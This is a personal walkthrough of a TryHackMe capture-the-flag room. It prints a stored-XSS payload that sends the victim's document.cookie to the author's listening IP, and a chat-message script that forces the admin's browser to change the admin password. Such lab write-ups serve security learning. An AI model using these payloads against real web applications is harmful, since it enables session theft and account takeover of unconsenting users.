# Whats Your Name

https://tryhackme.com/r/room/whatsyourname

"This challenge will test client-side exploitation skills, from inspecting Javascript to manipulating cookies to launching CSRF/XSS attacks...Never click on links received from unknown sources. Can you capture the flags and get admin access to the web app?"

A simple enough room, with some clever XSS / CSRF exploitation.

1. A scan reveals 22, 80 and 8081. There is a note saying the domain **worldwap.thm** should be set in hosts
2. On worldwap.thm is a site where you can register a new account. Going by the hints and the room name, a guess is the 'name' field might be vulnerable to xss
3. To exploit this, I registered a new user with the name ``<script>fetch(`http://10.10.162.83:443/?z=${document.cookie}`)</script>`` and set up a webserver. This got a cookie value that then worked on login.worldwap.thm (the domain is revealed when you register a user)
4. On The second site, logged in as a 'moderator', the first flag is visible in the heading.
5. There are two features of this site: a chat system with the admin bot and a change password tool. Change password when attempted, says it only works for the admin.
6. By creating the following chat message, I performed CSRF on the admin: `<script>fetch('/change_password.php', {method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: 'new_password=Password1'})</script>`
7. Finally, I was able to log in as `admin:Password1` and get the final flag from the header.

I had a bit of experimentation with this room, attempts that didn't work out. First, on the XSS, trying fetch(url+document.cookie) note the plus didn't work. Some encoding fail no doubt somewhere, despite my efforts with url encoding. Using a javascript string literal managed to get past this.

Secondly, the chat exploitation was a bit tricky. Initial attempts with js failed, not sure why, but I found that putting in links would work. Initially I tried some sort of exploitation with httpbeef, but update troubles got in the way.

Fun little room anyway :)
